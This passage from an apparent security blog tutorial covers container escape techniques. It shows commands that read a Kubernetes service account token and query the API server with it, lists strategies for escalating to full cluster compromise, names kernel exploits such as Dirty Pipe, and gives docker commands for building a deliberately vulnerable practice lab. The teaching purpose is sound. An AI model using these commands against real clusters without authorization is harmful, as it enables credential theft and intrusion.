</span></span></code></pre></div><blockquote><p><strong>Detection Tip:</strong> Look for mount points in <code>df -h</code> or <code>mount</code> that show filesystem types like &ldquo;ext4&rdquo; or &ldquo;xfs&rdquo; rather than &ldquo;overlay&rdquo; or &ldquo;tmpfs&rdquo;. These are often host mounts.</p></blockquote><h3 id=5-kubernetes-service-account-tokens--rbac>5. Kubernetes Service Account Tokens & RBAC</h3><p><strong>Why it works:</strong> Kubernetes pods automatically mount service account tokens by default. If the service account has elevated RBAC permissions, you can interact with the Kubernetes API to escalate privileges.</p><p><strong>Detection & Enumeration:</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>TOKEN</span><span class=o>=</span><span class=k>$(</span>cat /var/run/secrets/kubernetes.io/serviceaccount/token<span class=k>)</span>
</span></span><span class=line><span class=cl><span class=nv>APISERVER</span><span class=o>=</span>https://kubernetes.default.svc
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Check basic access</span>
</span></span><span class=line><span class=cl>curl -k -H <span class=s2>&#34;Authorization: Bearer </span><span class=nv>$TOKEN</span><span class=s2>&#34;</span> <span class=nv>$APISERVER</span>/api/v1/namespaces
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Check permissions</span>
</span></span><span class=line><span class=cl>curl -k -H <span class=s2>&#34;Authorization: Bearer </span><span class=nv>$TOKEN</span><span class=s2>&#34;</span> <span class=se>\
</span></span></span><span class=line><span class=cl>  <span class=nv>$APISERVER</span>/apis/rbac.authorization.k8s.io/v1/clusterroles
</span></span></code></pre></div><p><strong>Exploitation strategies:</strong></p><ul><li>If you can create pods: Create a privileged pod with host filesystem mounted</li><li>If you can exec into pods: Use kubectl exec equivalent via API to access other pods</li><li>If you can read secrets: Enumerate all secrets in the cluster for credentials</li><li>If you have cluster-admin: Full cluster compromise</li></ul><blockquote><p><strong>Real-world note:</strong> Many production Kubernetes clusters have overly permissive RBAC configurations. Service accounts often have more permissions than necessary due to convenience or troubleshooting needs.</p></blockquote><h3 id=6-kernel-exploits>6. Kernel Exploits</h3><p><strong>Why it works:</strong> Containers share the host kernel. Any kernel vulnerability is exploitable from inside containers, potentially leading to host compromise.</p><p><strong>Detection:</strong> Identify kernel version with <code>uname -r</code> and cross-reference with known CVEs using tools like linux-exploit-suggester.</p><blockquote><p><strong>Extreme Caution Required:</strong> Kernel exploits can crash the entire host system, taking down all containers and potentially corrupting data. Use only in isolated lab environments where system crashes are acceptable. Never use kernel exploits in production assessments without explicit authorization and acceptance of risk.</p></blockquote><p><strong>Common kernel vulnerabilities used in container escapes:</strong></p><ul><li>Dirty COW (CVE-2016-5195) — Write to read-only memory mappings</li><li>Dirty Pipe (CVE-2022-0847) — Overwrite data in arbitrary read-only files</li><li>Various use-after-free vulnerabilities in kernel subsystems</li><li>Privilege escalation through eBPF vulnerabilities</li></ul><hr><h2 id=lab-setup--practice>Lab Setup & Practice</h2><p>The best way to understand these techniques is to practice in a safe environment. Here&rsquo;s how to build your own container escape lab.</p><h3 id=quick-vulnerable-lab-setup>Quick Vulnerable Lab Setup</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Privileged container</span>
</span></span><span class=line><span class=cl>docker run -it --privileged ubuntu:latest bash
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Docker socket mounted</span>
</span></span><span class=line><span class=cl>docker run -it -v /var/run/docker.sock:/var/run/docker.sock ubuntu:latest bash
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Writable host mount</span>
</span></span><span class=line><span class=cl>docker run -it -v /:/host ubuntu:latest bash
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Excessive capabilities</span>
</span></span><span class=line><span class=cl>docker run -it --cap-add<span class=o>=</span>SYS_ADMIN ubuntu:latest bash
</span></span></code></pre></div><h3 id=recommended-practice-resources>Recommended Practice Resources</h3><ul><li><strong>HackTheBox:</strong> Several machines focused on container escapes</li><li><strong>TryHackMe:</strong> Docker and Kubernetes security rooms</li><li><strong>Kubernetes Goat:</strong> Intentionally vulnerable Kubernetes cluster for practice</li><li><strong>Bad Pods:</strong> Repository of vulnerable Kubernetes pod configurations</li></ul><hr><h2 id=additional-resources>Additional Resources</h2><h3 id=tools>Tools</h3><ul><li><strong>amicontained:</strong> Container introspection tool to identify capabilities and configuration</li><li><strong>deepce:</strong> Docker enumeration, escalation of privileges, and container escapes</li><li><strong>cdk:</strong> Zero dependency container penetration toolkit</li><li><strong>kubectl-who-can:</strong> Show who has RBAC permissions in Kubernetes</li><li><strong>kube-hunter:</strong> Hunt for security weaknesses in Kubernetes clusters</li><li><strong>trivy:</strong> Vulnerability scanner for containers and other artifacts</li></ul><h3 id=further-reading>Further Reading</h3><ul><li><a href=https://docs.docker.com/engine/security/>Docker Security Documentation</a></li><li><a href=https://kubernetes.io/docs/concepts/security/pod-security-standards/>Kubernetes Pod Security Standards</a></li><li><a href=https://attack.mitre.org/matrices/enterprise/containers/>MITRE ATT&amp;CK: Containers Matrix</a></li><li><a href=https://github.com/stealthcopter/deepce>DeepCE - Docker Enumeration Tool</a></li></ul><hr><h2 id=acknowledgments>Acknowledgments</h2><p>Shoutout to <a href=https://x.com/rsgbengii>@rsgbengii</a> for a wonderfull artcle on container security and awesome newsletter, never disappoints &lt;\3</p></content><p></p></main><footer><footer><p style=text-align:center;margin-bottom:.5rem;color:#8f0000!important>trying.</p></footer></footer></body></html>